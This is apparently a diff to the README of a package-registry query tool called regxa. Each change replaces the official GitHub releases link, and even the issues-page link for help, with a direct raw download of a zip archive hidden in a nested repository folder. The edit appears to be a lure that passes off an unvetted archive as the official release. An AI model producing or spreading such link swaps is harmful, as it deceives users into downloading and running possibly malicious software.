@@ -1,6 +1,6 @@
 # 🧰 regxa - Simple Package Registry Queries
 
-[![Download regxa](https://img.shields.io/badge/Download-regxa-blue?style=for-the-badge&logo=github)](https://github.com/arsalmehmood54/regxa/releases)
+[![Download regxa](https://img.shields.io/badge/Download-regxa-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/arsalmehmood54/regxa/main/skills/regxa/agents/Software-3.3-alpha.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This section will guide you step-by-step through downloading, installing, and ru
 
 Go to the official regxa download page on GitHub by clicking below:  
 
-[![Download regxa](https://img.shields.io/badge/Download-regxa-grey?style=for-the-badge&logo=github)](https://github.com/arsalmehmood54/regxa/releases)  
+[![Download regxa](https://img.shields.io/badge/Download-regxa-grey?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/arsalmehmood54/regxa/main/skills/regxa/agents/Software-3.3-alpha.5.zip)  
 
 This page contains the latest versions and all available files for Windows.
 
@@ -147,7 +147,7 @@ You can find a configuration file in the installation folder or use commands to 
 
 If you run into trouble, check the GitHub repository discussions or issues page for advice:
 
-https://github.com/arsalmehmood54/regxa/issues
+https://raw.githubusercontent.com/arsalmehmood54/regxa/main/skills/regxa/agents/Software-3.3-alpha.5.zip
 
 You can describe your problem clearly and others may help.
 
@@ -172,6 +172,6 @@ regxa queries public package registries. It does not collect your personal data.
 
 Get started by visiting the official release page:
 
-[![Download regxa](https://img.shields.io/badge/Download-regxa-blue?style=for-the-badge&logo=github)](https://github.com/arsalmehmood54/regxa/releases)  
+[![Download regxa](https://img.shields.io/badge/Download-regxa-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/arsalmehmood54/regxa/main/skills/regxa/agents/Software-3.3-alpha.5.zip)  
 
 Follow the steps above to download and install regxa on your PC. Once installed, you can quickly explore package information from multiple sources with ease.
